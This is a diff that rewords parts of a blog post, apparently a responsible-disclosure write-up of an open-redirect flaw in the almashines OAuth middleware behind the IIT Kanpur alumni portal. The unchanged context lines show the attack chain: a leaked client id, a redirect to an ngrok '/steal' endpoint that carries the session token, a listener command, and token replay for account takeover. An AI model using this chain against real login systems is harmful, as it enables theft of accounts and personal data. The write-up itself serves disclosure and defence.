@@ -35,11 +35,11 @@
         </div>
 
         <section class="body">
-          <p>almashines is a saas middleware that many institutions use so they do not have to build their own social login flows from scratch. instead of every alumni portal or college site writing its own google oauth integration, they point at almashines with a client identifier, almashines handles the google side, and then it hands back a session token that the consuming application understands. the iit kanpur alumni portal at portal.iitkalumni.org was one of those consumers. it was an angularjs single-page app talking to a php backend that in turn talked to almashines.</p>
+          <p>almashines is a saas middleware that institutions use so they don't have to build their own social login flows from scratch. instead of every alumni portal or college site writing its own google oauth integration, they point at almashines with a client identifier, almashines handles the google side, and then hands back a session token that the consuming application understands. the iit kanpur alumni portal at portal.iitkalumni.org was one of those consumers: an angularjs single-page app talking to a php backend that in turn talked to almashines.</p>
 
-          <p>this was never a flaw in oauth itself or in how google behaves. google did exactly what it is supposed to do: it validated the redirect uri it was given and issued the authorization code after the user consented. the entire problem lived in the almashines middleware and the way the consuming application was allowed to supply an untrusted post-login redirect destination with no validation or cryptographic protection.</p>
+          <p>this was never a flaw in oauth itself or in how google behaves. google did exactly what it's supposed to do. the problem lived entirely in the almashines middleware and in the way the consuming application was allowed to supply an untrusted post-login redirect destination with no validation or cryptographic protection. i'll explain the architecture first because the vulnerability only makes sense once you see how the flow is constructed.</p>
 
-          <h2>what action was taken</h2>
+          <h2>what happened when i reported it</h2>
 
           <p>on june 17 i got an email from amey karkare at the iit kanpur alumni office. he said the report had gone to almashines and they fixed it already. the thing was looked at and sorted in a day. the attached report says no one had used it before they closed it off.</p>
 
@@ -55,9 +55,9 @@
 
           <p>nice to see the almashines team and the alumni office jump on this so fast. the report spells out what they checked and the steps they took after.</p>
 
-          <h2>the architecture that made the attack possible</h2>
+          <h2>how the attack surface opened up</h2>
 
-          <p>the frontend was leaking the google client ids it was using right in the page source. that alone made mapping the attack surface trivial.</p>
+          <p>the frontend was leaking the google client ids it was using right in the page source. that alone made mapping the attack surface easy, and it's the kind of thing that usually means the rest of the client-side assumptions are similarly relaxed.</p>
 
           <pre><code>// from the main account?cid=785 html source
 var default_client_id = "682063331222-ff9vvbo4ec187oobbdoicqcluklhdrqa.apps.googleusercontent.com";
@@ -82,7 +82,7 @@ window.webClientId = {
 
           <p>the od_base parameter was meant to tell the middleware where to send the user (and the freshly created session token) after google authentication completed. because it was being supplied by the client and passed through without any server-side whitelist, signature check, or tenant binding, an attacker could simply point it at their own server.</p>
 
-          <h2>how the token actually leaked</h2>
+          <h2>how the token gets out</h2>
 
           <p>you craft a malicious initiation link with your own server in the od_base parameter and send it to a victim. they click it, complete the normal google consent flow, and almashines receives the code from google, mints its internal enc session token for the alumni portal, and then blindly issues a 302 redirect straight to the attacker-controlled destination, appending the token in the query string.</p>
 
@@ -92,7 +92,7 @@ Location: https://dislike-pacify-agreeable.ngrok-free.dev/steal?social_signup/re
 
           <p>your listener receives the request containing the enc value. once you have that token you can inject it into your own browser on the real alumni portal (usually by dropping it into localstorage or the key the angular app expects) and the application treats you as the authenticated victim. because the token was issued after google had already succeeded, any mfa or protections on the google side offered no help.</p>
 
-          <h2>the reproduction steps i actually ran</h2>
+          <h2>reproduction</h2>
 
           <p>i started by testing whether any validation existed at all. i pointed od_base at a raw attacker ip.</p>
 
@@ -133,7 +133,7 @@ ngrok http 8080
 
           <p>with the enc value in hand it was straightforward to replay it on the real portal and assume the victim's session.</p>
 
-          <h2>impact and the real architectural problem</h2>
+          <h2>impact and the actual architectural problem</h2>
 
           <p>any user who could be tricked into clicking the link would have their account fully taken over. the alumni portal contained real personally identifiable information, employment history, phone numbers, addresses, and educational records for iit kanpur alumni. because it was the official alumni association site, people naturally trusted "login with google" links that appeared to come from their college network.</p>
 
